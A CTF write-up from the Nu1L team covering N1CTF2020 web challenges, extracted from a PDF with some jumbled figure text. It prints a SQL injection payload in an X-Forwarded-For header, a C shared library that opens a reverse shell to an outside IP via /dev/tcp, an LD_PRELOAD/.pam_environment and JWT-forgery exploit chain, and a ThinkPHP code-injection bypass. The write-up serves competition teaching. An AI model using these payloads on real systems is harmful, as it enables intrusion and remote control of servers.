N1CTF2020 Writeup
Author:Nu1L Team
WEB
signin
GinDriver
Design
Information Gathering
Webauthn
Reverse Engineering
Identity Forgery
Arbitrary File Uploading
Arbitrary File Reading
Get Shell
Easy_tp5
Expected solution
Unexpected 1
Unexpected 2
Unexpected 3
Unexpected 4
It's half expected 5
Zabbix_fun
Docker_manager
The King Of Phish
Victim Bot
UserA-PC
DC
Pwn
SignIn
EasyWrite
Babyrouter
Unexcepted
Excepted
Escape
Echoserver
Kemu
W2L
Crypto
VSS
BabyProof
Zero-knowledge proof
HNP
Code
Curve
Easy RSA?
Factor N
solve LWE
code
FlagBot
Reverse
Oﬂo
Oh My Julia
EasyAPK
Fixed Camera
N1vault
EasyRE
Auth
BabyCompiler
BabyOS
Rrr
Misc
Filters
Intended solution
Case ABCDEFGHI
Conclusion
Unintended solution
GinDriver Revenge
N1egg
N1egg In Fixed Camera
WEB
signin
payload here：
GET /?
input=O%3A4%3A%22flag%22%3A1%3A%7Bs%3A2%3A%22ip%22%3BO%3A2%3A%22ip%22%3A0%3A%7B%
7D%7D HTTP/1.1
Host: 101.32.205.189
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag
e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
X-Forwarded-For: 123.123.123.13' or updatexml(1,concat(0x7e,(select if((select 
substr(version(),2,1)='.'),'n1ctf',1))),0) or '
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
key is in database,but if u use select key from n1key ,u cannot ﬁnd it.Why?
GinDriver
Design
This challenge is designed into two separated part, as we can see in the platform are GinDriver  
and GinDriver Revenge . In fact, the original idea is inspired by plusls, that he found a trick that 
may leading to RCE by uploading a malicious dynamic-link library and .pam_environment  ﬁle to 
bypass sshd mechanism (inspired by CVE-2015-8325 ). So, I designed the ﬁrst part to make a 
springboard helping challengers ﬁnding a way leaping to the second part.
The overall design is described below:
GinDriver: A misusing of JWT signing mechanism leading to identity forgery, and overwriting 
conﬁg ﬁle through ﬁle uploading to launch MySQL client LOAD DATA LOCAL INFILE  attack 
gaining arbitrary ﬁle reading.
GinDriver Revenge: A reverse shell can be triggered while ssh server accepted a new 
connection by uploading .pam_environment  ﬁle to inject LD_PRELOAD  environment which is 
pointed to a malicious dynamic-link library.
Information Gathering
As the giving attachment, it's quiet easy to determine that backend service is developed by 
golang and Gin  framework. Frontend is developed by umi and React.
The challenge using Webauthn to authenticate users, and authenticated user will redirect to ﬁle 
uploading part, while the ﬁle uploading function is admin  only.
Webauthn
According to W3C Recommendation, Webauthn has two main ﬂows described as two ﬁgures 
below.
Registration Flow:
Relying Party Server
Authenticator
challenge, 
user info, 
relying party info
relying party id , 
user info, 
relying party info, 
clientDataHash
new public key, 
credential id, 
attestation
clientDataJSON, 
attestationObject
1
2
5
4
3
user verification, 
new keypair, 
attestation
attestationObject
Browser
RP JavaScript Application
6
0
server validation
AuthenticatorAttestationResponse
PublicKeyCredentialCreationOptions
Authentication Flow:
Relying Party Server
Authenticator
challenge
relying party id, 
clientDataHash
authenticatorData 
signature
clientDataJSON, 
authenticatorData, 
signature
1
2
5
4
3
user verification, 
create assertion
Browser
RP JavaScript Application
6
0
server validation
AuthenticatorAssertionResponse
PublicKeyCredentialRequestOptions
WebAuthnAPI
As we can see, public key replaced password, playing an important role in Webauthn 
authentication.
Reverse Engineering
Through IDA, we can easily analyze internal logic. First of all, we can assume the following route:
The critical point is in LoginRequired  middleware. This middleware decodes Authorization  
header, gets JWT payloads and check signature using user-speciﬁc Webauthn public key, which is 
uploaded by user.
Static router:
    GET /pubkeys/ -> ./public/pubkeys
API router:
    POST /api/auth/register/begin
    PATCH /api/auth/register/:name/finish
    GET /api/auth/login/:name/begin
    PATCH /api/auth/login/:name/finish
Login Required router:
    GET /api/user/:name
    POST /api/user/file/upload
In ﬁle uploading part, we can even ﬁnd path traversal vulnerability in blackbox, that can upload 
arbitrary ﬁle to any location with suﬃcient write permission.
Last but not least, in main , configor  is conﬁgured to auto reload conﬁg ﬁle while it has been 
changed, and execute database auto migration.
From now, we may ﬁgure out an exploit chain in this web challenge:
Identity Forgery -> Arbitrary File Uploading -> Overwrite Conﬁg File -> Database Auto 
Migration -> MySQL LOAD DATA LOCAL INFILE  -> Arbitrary File Reading
Identity Forgery
According to the analysis above, we can now using the public key of admin  to forge JWT token, 
gaining ﬁle uploading.
Notice that there's a new line ( \n ) in the admin.pub .
So, we can easily forge an admin  JWT token by accessing jwt.io. Add it to authorization  header, 
and send via burp to conﬁrm.
Arbitrary File Uploading
After forged admin  JWT token, we can now upload conﬁg ﬁle to overwrite existing one, waiting 
conﬁg ﬁle auto reload and database auto migration to trigger MySQL LOAD DATA LOCAL INFILE .
Arbitrary File Reading
By trigger MySQL LOAD DATA LOCAL INFILE , we can easily gaining arbitrary ﬁle reading to read 
ﬂag under /flag .ol...
Get Shell
By upload public key to ~/.ssh/authorized_keys , attacker can access the server via openssh. 
After write pubic key, attacker can write ~/.pam_environment  and upload malicious 
ﬁle /tmp/exp.so .
~/.pam_environment
curl https://web.c7466953fb.nu1lctf.com/pubkeys/admin.pub -v
> GET /pubkeys/admin.pub HTTP/2
> Host: web.c7466953fb.nu1lctf.com
> User-Agent: curl/7.64.0
> Accept: */*
>
#include 
#include 
void getShell() __attribute__((constructor));
void getShell()
{
    char *argv[] = {
        "/bin/sh",
        "-c",
        "/bin/bash -c \"/bin/bash -i  1>&/dev/tcp/114.5.1.4/1919 0<&1\"",
        NULL
    };
    execve("/bin/sh", argv, NULL);
}
4. And only writable in the public  directory is set
chown -R root:root /var/www/html
chmod -R 755 /var/www/html
chmod 777 /var/www/html/public
As we all know, in the actual combat environment of tp5.0.x + php7, if disable_functions limits all 
single parameter dangerous functions. We need to use __include_file  in 
/thinkphp/library/think/Loader.php  to include log、session、 uploadﬁle to getshell.Of 
course, some people have dug out the 5.0.x deserialization chain some time ago, so it can also 
cooperate with the unserialize .
During the course of the competition, a lot of people used the inclusion in think/Lang::load , 
which was not noticed before.
Tp5.0.x rce process will not be discussed here.Just know that now we can control $filters  and 
$value . And now the calling function can only pass in a single parameter. So we can't call 
file_put_content  to write the shell. So we need to ﬁnd out where dangerous functions 
call_user_func_array 、 file_put_content  and so on are called in TP5.
Expected solution
Take a look at the method of \think\Build::buildHello . 
We can call it indirectly through the module  method, and the ﬁrst parameter $module  is 
controllable, and the writing content is partially controllable.
We can control the following test  values
The bypass method is very simple. test;phpinfo();//  can be used, and then getshell with 
inlcude ﬁle.
In actual combat, the application directory may not have write permission, unless it is windows. 